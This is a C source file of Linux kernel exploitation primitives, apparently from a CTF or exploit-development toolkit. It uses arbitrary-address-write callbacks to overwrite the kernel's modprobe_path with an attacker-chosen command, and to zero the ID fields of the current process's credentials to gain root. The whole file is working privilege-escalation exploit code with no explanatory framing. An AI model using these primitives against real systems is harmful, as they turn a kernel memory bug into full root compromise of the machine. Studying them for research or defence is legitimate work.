#include <stdint.h>
#include <stdio.h>
#include <string.h>

#include "vars.h"

// CONFIG_STATIC_USERMODEHELPER=n
void overwrite_modprobe_path(const char *const cmd, void (*aaw32)(void *, uint32_t),
                             void (*aaw64)(void *, uint64_t)) {
    if (addr_modprobe_path == DUMMY_VALUE + kbase_offset) {
        puts("[-] please set addr_modprobe_path");
        return;
    }

    const uint64_t len = strlen(cmd);
    if (aaw32 != NULL) {
        puts("[+] overwrite modprobe_path");
        for (uint64_t i = 0; i < len; i += 4) {
            aaw32((void *)addr_modprobe_path + i, *(uint32_t *)&cmd[i]);
        }
    } else if (aaw64 != NULL) {
        puts("[+] overwrite modprobe_path");
        for (uint64_t i = 0; i < len; i += 8) {
            aaw64((void *)addr_modprobe_path + i, *(uint64_t *)&cmd[i]);
        }
    } else {
        puts("[-] please implement aaw function");
    }
}

void overwrite_cred(void *const addr_cred, void (*aaw32)(void *, uint32_t),
                    void (*aaw64)(void *, uint64_t)) {
    if (aaw32 != NULL) {
        puts("[+] overwrite current->cred");
        for (uint64_t i = 0; i < 8; i++) {
            aaw32(addr_cred + 4 + 4 * i, 0);
        }
    } else if (aaw64 != NULL) {
        puts("[+] overwrite current->cred");
        for (uint64_t i = 0; i < 4; i++) {
            aaw64(addr_cred + 4 + 8 * i, 0);
        }
    } else {
        puts("[-] please implement aaw function");
    }
}
